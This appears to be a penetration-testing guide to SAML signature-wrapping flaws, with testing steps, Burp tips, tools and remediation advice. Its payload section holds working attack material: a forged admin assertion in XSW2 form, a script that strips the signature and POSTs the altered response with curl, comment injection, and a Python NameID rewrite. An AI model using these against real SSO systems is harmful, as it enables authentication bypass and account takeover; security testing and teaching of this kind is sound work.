# SAML Vulnerabilities (Signature Wrapping)

## Overview
SAML (Security Assertion Markup Language) is an XML-based standard for exchanging authentication and authorization data between an Identity Provider (IdP) and a Service Provider (SP). XML Signature Wrapping (XSW) attacks exploit the way SAML implementations locate and validate the signed portion of a SAML assertion — an attacker injects a malicious, unsigned element into the assertion while keeping the original signed element intact, causing the application to use the unsigned (attacker-controlled) data. This leads to authentication bypass and privilege escalation.

## How It Works
- SAML assertions are XML documents signed with XMLDSig. The signature covers a specific element, identified by a reference ID.
- Many SAML parsing libraries find the signed element by XPath or by searching for the first occurrence of a given element name.
- In XSW attacks, the attacker duplicates the assertion: one copy retains the valid signature (satisfying signature verification), and another copy with modified claims (different username, different roles) is placed where the SP's application code reads from.
- Common XSW variants (XSW1–XSW8) position the malicious element in different locations relative to the signed element.
- Additional vulnerabilities: comment injection (`<!--` in usernames that certain XML parsers strip), SAML signature exclusion (removing the `<ds:Signature>` block entirely if the SP doesn't require signatures), and algorithm confusion (MD5 or SHA1 weaknesses).

## Impact
- Authentication bypass — log in as any user, including administrators, without knowing their password.
- Privilege escalation — modify role or group claims to gain elevated permissions.
- Account takeover — by forging assertions for specific user identities.
- Complete compromise of all SP applications if the IdP is trusted by many SPs.

## Where to Look
- Any application using SSO via SAML: look for SAMLResponse in POST requests.
- The `SAMLResponse` parameter in POST requests to the SP's Assertion Consumer Service (ACS) URL.
- The assertion's `NameID` element (the username/identity claim).
- Attribute statements (roles, groups, email, permissions).
- The `<ds:Signature>` element's `Reference URI` attribute — this is what is actually signed.
- The XML namespace handling of the SP's library.
- SAML metadata endpoint: `/saml/metadata` or `/metadata.xml` for SP/IdP configuration.

## Testing Steps
1. Trigger a SAML login flow and capture the `SAMLResponse` POST request in Burp.
2. Base64-decode the `SAMLResponse` value and inflate/decompress it (SAML may be deflated/gzip compressed).
3. Inspect the XML: find the `<ds:Signature>` element, the `Reference URI` attribute, and the `NameID` element.
4. Use the SAML Raider Burp extension to automate XSW attack generation (it generates XSW1–XSW8 variants automatically).
5. Test signature removal: delete the `<ds:Signature>` block entirely and re-encode the SAML response — submit it and observe if authentication succeeds.
6. Test comment injection: change `NameID` to `admin<!--injection-->` and similar variations.
7. Test XML namespace confusion: add a new assertion with a modified `NameID` outside the signed element.
8. Verify signature algorithm strength: if `sha1WithRSAEncryption` or `MD5`, flag as weak.
9. Check if the SP validates the assertion's `NotBefore` / `NotOnOrAfter` conditions (replay prevention).

## Payloads / Techniques

Base64 decode and inspect SAMLResponse:
```bash
# Capture SAMLResponse from Burp
echo "BASE64_ENCODED_SAML_RESPONSE" | base64 -d | python3 -c "import sys,zlib; print(zlib.decompress(sys.stdin.buffer.read(), -15).decode())"

# Or without compression:
echo "BASE64_SAML" | base64 -d
```

XSW attack (manual, XSW2 variant — duplicate assertion before signed one):
```xml
<samlp:Response>
  <!-- Attacker's unsigned assertion (app reads this) -->
  <saml:Assertion ID="attacker_assertion">
    <saml:NameID>admin@target.com</saml:NameID>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>administrator</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>

  <!-- Original signed assertion (signature validates this) -->
  <saml:Assertion ID="original_id">
    <ds:Signature><!-- valid signature --></ds:Signature>
    <saml:NameID>regular_user@target.com</saml:NameID>
  </saml:Assertion>
</samlp:Response>
```

Signature removal attack:
```bash
# Decode SAMLResponse
DECODED=$(echo "$SAML_RESPONSE" | base64 -d)
# Remove the <ds:Signature>...</ds:Signature> block
MODIFIED=$(echo "$DECODED" | python3 -c "
import sys, re
data = sys.stdin.read()
data = re.sub(r'<ds:Signature.*?</ds:Signature>', '', data, flags=re.DOTALL)
print(data)
")
# Re-encode
NEW_RESPONSE=$(echo "$MODIFIED" | base64 -w0)
# Submit via curl
curl -X POST https://target.com/saml/acs \
  -d "SAMLResponse=$NEW_RESPONSE&RelayState=/"
```

Comment injection test:
```xml
<saml:NameID>admin<!--fakecomment-->@target.com</saml:NameID>
<!-- Some parsers may strip the comment, reading "admin@target.com" -->
```

SAML Raider Burp extension (automated):
```
# In Burp, right-click the SAMLResponse request
# SAML Raider → XSW Attacks → Run all XSW variants
# Review which variant returns a successful response
```

Python saml_attacks.py (using python3-saml or onelogin-saml2 debug):
```python
import base64
from lxml import etree

# Parse and manipulate assertion
saml_response = base64.b64decode(RESPONSE_B64)
root = etree.fromstring(saml_response)

# Find NameID and change it
ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}
name_id = root.find('.//saml:NameID', ns)
if name_id is not None:
    original = name_id.text
    name_id.text = 'admin@target.com'
    print(f"Changed NameID from {original} to admin@target.com")

modified = base64.b64encode(etree.tostring(root)).decode()
print(modified)
```

## Burp Suite Tips
- Install **SAML Raider** from the BApp Store — it decodes SAML responses inline, lets you edit XML, re-sign assertions, and run all 8 XSW attack variants with one click.
- In Proxy, the **SAMLResponse** parameter appears URL-encoded in the body — use "Decode" in the Inspector panel to view the base64 content.
- Use **Repeater** to manually submit modified SAML responses after editing the XML.
- The **JWT/SAML Decoder** extension provides inline decoding in the Proxy view.
- Use **Active Scan** in Burp Pro with the SAML Raider extension active — it can automatically test XSW variants.
- Check the **Response** in Repeater after XSW attacks for user-specific content (name, email, dashboard) that confirms the identity switch worked.

## Tools
- **SAML Raider** (Burp Extension) — Automated XSW attack generation and SAML assertion editing.
- **samlreq** — CLI tool for decoding, modifying, and re-encoding SAML requests/responses.
- **SAMLExtractor** — Extracts and decodes SAML from captured traffic.
- **xml-security-c** — For testing XML signature validation in custom applications.
- **Burp Suite Pro** — Integrated SAML testing with extensions.

## Remediation
- Use a well-maintained, actively patched SAML library (python3-saml, onelogin-saml2, Shibboleth) — avoid custom XML signature validation code.
- Validate that the signature covers the entire assertion and that the assertion being processed matches the signed element's `ID` attribute exactly.
- Always require and validate SAML signatures — never allow unsigned assertions in production.
- Validate `NotBefore` and `NotOnOrAfter` conditions to prevent replay attacks.
- Use SHA-256 or stronger for signature algorithms; reject MD5 and SHA1.
- Validate the `Issuer` element against a whitelist of trusted IdPs.
- Limit accepted clock skew to 2–5 minutes maximum.
- Audit XML processing libraries for XXE (XML External Entity) vulnerabilities in addition to XSW.

## References
https://portswigger.net/web-security/xml-based-vulnerabilities
https://research.aurainfosec.io/bypassing-saml20-SSO
https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-8-23-12.pdf
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/12-Testing_SAML_Assertions
https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html
